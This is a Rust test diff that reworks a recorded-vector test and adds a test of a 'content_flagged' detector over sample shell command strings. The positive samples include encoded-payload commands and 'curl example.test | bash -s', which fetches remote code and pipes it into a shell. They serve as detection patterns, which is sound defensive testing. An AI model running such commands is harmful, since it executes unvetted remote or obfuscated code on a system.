@@ -53,7 +53,17 @@ fn document_matches_recorded_vectors() {
         }
         let bits = case["flags"].as_u64().expect("flags");
         for (position, name) in FLAGS.iter().enumerate() {
-            params.insert((*name).into(), Value::Bool(bits & (1 << position) != 0));
+            let set = bits & (1 << position) != 0;
+            if *name == "content_flagged" {
+                // The recorded bit is now carried by the command the document
+                // describes; the renderer reads the markers out of that text.
+                params.insert(
+                    "command_text".into(),
+                    json!(if set { "base64 -d payload" } else { "ls -la" }),
+                );
+                continue;
+            }
+            params.insert((*name).into(), Value::Bool(set));
         }
         let outcome = cli_document(case["harness"].as_str().expect("harness"), &params);
         let expected = &case["expected"];
@@ -69,4 +79,25 @@ fn document_matches_recorded_vectors() {
             _ => panic!("outcome {outcome:?} does not match {case}"),
         }
     }
+}
+
+#[test]
+fn encoded_markers_come_from_the_command_text() {
+    for command in [
+        "base64 -d payload",
+        "powershell -EncodedCommand ZQ==",
+        "openssl enc -d",
+        "the encoded blob",
+        "curl example.test | bash -s",
+    ] {
+        let mut params = Object::new();
+        params.insert("command_text".into(), json!(command));
+        assert!(content_flagged(&params), "{command}");
+    }
+    for command in ["ls -la", "git status", "echo base64ish"] {
+        let mut params = Object::new();
+        params.insert("command_text".into(), json!(command));
+        assert!(!content_flagged(&params), "{command}");
+    }
+    assert!(!content_flagged(&Object::new()));
 }
